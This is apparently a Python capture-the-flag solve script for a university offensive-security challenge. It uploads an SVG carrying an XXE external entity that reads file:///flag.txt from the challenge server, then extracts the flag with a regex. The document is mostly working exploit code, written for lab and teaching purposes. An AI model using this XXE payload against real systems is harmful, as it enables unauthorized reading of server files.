#import from py
import re

#outside imports
import requests
from pwn import *

host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1242
netid='adp369'

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds
requests_proxies = {}
requests_proxies['http'] = 'http://192.168.149.1:8080'

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None



xxe_xml_content = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE bar [ <!ENTITY foo SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <text>&foo;</text>
</svg>"""


def solve():
    url = 'http://%s:%d' % (host, port)
    cookies = {'CHALBROKER_USER_ID':netid}
    files = {"uploaded": ("pwn.svg", xxe_xml_content)}
    r = requests.post(url, files=files, cookies=cookies, proxies=requests_proxies)
    return find_flag(r.text)

#scaffolding
def main():
    flag = solve()
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
